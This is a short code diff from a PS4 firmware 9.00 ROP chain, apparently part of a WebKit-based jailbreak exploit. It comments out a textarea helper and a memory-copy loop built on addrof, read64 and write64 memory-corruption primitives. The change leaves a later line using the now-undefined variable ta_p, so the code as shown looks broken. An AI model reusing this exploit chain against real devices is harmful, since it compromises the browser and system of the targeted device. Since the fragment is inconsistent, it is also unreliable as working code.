@@ -468,7 +468,7 @@ class Chain900Base extends ChainBase {
 }
 
 // helper object for ROP
-const rop_ta = document.createElement('textarea');
+//const rop_ta = document.createElement('textarea');
 
 // Chain for PS4 9.00
 class Chain900 extends Chain900Base {
@@ -489,11 +489,11 @@ class Chain900 extends Chain900Base {
         const ta_clone = {};
         this.ta_clone = ta_clone;
         const clone_p = mem.addrof(ta_clone);
-        const ta_p = mem.addrof(rop_ta);
+        /*const ta_p = mem.addrof(rop_ta);
 
         for (let i = js_size; i < js_ta_size; i += 8) {
             clone_p.write64(i, ta_p.read64(i));
-        }
+        }*/
 
         const webcore_ta = ta_p.readp(offset_textarea_impl);
         const m_wrapped_clone = new Uint8Array(
